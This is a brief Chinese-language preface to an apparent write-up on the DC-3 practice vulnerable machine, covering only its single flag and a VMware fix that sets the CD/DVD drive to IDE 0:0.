前言

这个靶机是 @DCAU7 出品的系列靶机DC中的第三个DC-3 。

这个靶机只有1个flag，而且这个靶机直接导入vmware之后会有点小问题，直接启动会报下图所示的错误：

解决办法很简单，虚拟机 -> 设置 -> 硬件 -> CD/DVD(IDE)，选择右边的高级，然后将IDE改为IDE 0:0即可：

重新启动就可以正常进入靶机了。
